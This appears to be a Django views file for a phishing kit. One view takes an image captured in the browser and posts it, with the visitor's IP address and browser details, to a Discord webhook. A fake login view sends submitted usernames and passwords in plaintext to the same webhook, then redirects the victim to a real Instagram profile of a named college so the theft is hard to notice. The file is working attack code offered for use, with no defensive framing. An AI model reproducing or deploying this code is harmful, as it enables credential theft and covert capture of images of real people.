import base64
import os
import json
import requests
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render

DISCORD_WEBHOOK_URL = ''  # Replace with your webhook URL

@csrf_exempt
def upload_image(request):
    if request.method == 'POST':
        try:
            # Parse the request data
            data = json.loads(request.body)
            image_data = data.get('image', '').split(',')[1]  # Remove 'data:image/png;base64,' prefix
            image_bytes = base64.b64decode(image_data)

            # Save the image temporarily
            image_path = 'temp_image.png'
            with open(image_path, 'wb') as image_file:
                image_file.write(image_bytes)

            # Get IP address
            ip_address = get_client_ip(request)

            # Get User-Agent (browser info)
            user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')

            # Send image and metadata to Discord
            with open(image_path, 'rb') as img:
                response = requests.post(
                    DISCORD_WEBHOOK_URL,
                    files={'file': img},
                    data={
                        'content': f"New upload received:\nIP Address: {ip_address}\nUser-Agent: {user_agent}"
                    }
                )

            # Clean up temporary image
            os.remove(image_path)

            if response.status_code == 204:
                return JsonResponse({'message': 'Image and metadata sent to Discord successfully!'})
            else:
                return JsonResponse({'message': 'Failed to send data to Discord.'}, status=500)

        except Exception as e:
            return JsonResponse({'message': f'Error: {str(e)}'}, status=500)

    return JsonResponse({'message': 'Invalid request method.'}, status=400)

def get_client_ip(request):
    """
    Retrieve the client's IP address from the request object.
    """
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR', 'Unknown')
    return ip

def index(request):
    return render(request, 'capture/index.html')


from django.shortcuts import redirect

def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        # Log credentials to Discord
        payload = {"content": f"Login attempt:\nUsername: {username}\nPassword: {password}"}
        requests.post(DISCORD_WEBHOOK_URL, data=payload)

        # Redirect to the official Instagram page
        return redirect('https://www.instagram.com/ishaqiyya_college_muttumthala/profilecard/?igsh=MTc1YWh4ZmRneThkMQ==')  # Replace with the actual page URL
    
    return render(request, 'login.html')
